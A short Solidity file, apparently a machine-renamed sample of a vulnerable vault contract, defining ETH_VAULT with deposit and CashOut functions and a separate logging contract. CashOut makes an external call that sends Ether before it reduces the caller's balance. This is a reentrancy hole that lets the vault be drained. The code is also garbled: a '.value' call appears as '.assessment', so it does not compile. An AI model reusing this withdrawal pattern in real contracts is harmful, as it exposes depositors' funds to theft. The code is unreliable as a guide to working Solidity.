// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract ETH_VAULT
{
    mapping (address => uint) public benefitsRecord;

    Chart MoverecordsRecord;

    uint public MinimumContributefunds = 1 ether;

    function ETH_VAULT(address _log)
    public
    {
        MoverecordsRecord = Chart(_log);
    }

    function ProvideSpecimen()
    public
    payable
    {
        if(msg.value > MinimumContributefunds)
        {
            benefitsRecord[msg.sender]+=msg.value;
            MoverecordsRecord.IncludeAlert(msg.sender,msg.value,"Deposit");
        }
    }

    function CashOut(uint _am)
    public
    payable
    {
        if(_am<=benefitsRecord[msg.sender])
        {
            if(msg.sender.call.assessment(_am)())
            {
                benefitsRecord[msg.sender]-=_am;
                MoverecordsRecord.IncludeAlert(msg.sender,_am,"CashOut");
            }
        }
    }

    function() public payable{}

}

contract Chart
{

    struct Alert
    {
        address Referrer;
        string  Record;
        uint Val;
        uint  Instant;
    }

    Alert[] public History;

    Alert EndingMsg;

    function IncludeAlert(address _adr,uint _val,string _data)
    public
    {
        EndingMsg.Referrer = _adr;
        EndingMsg.Instant = now;
        EndingMsg.Val = _val;
        EndingMsg.Record = _data;
        History.push(EndingMsg);
    }
}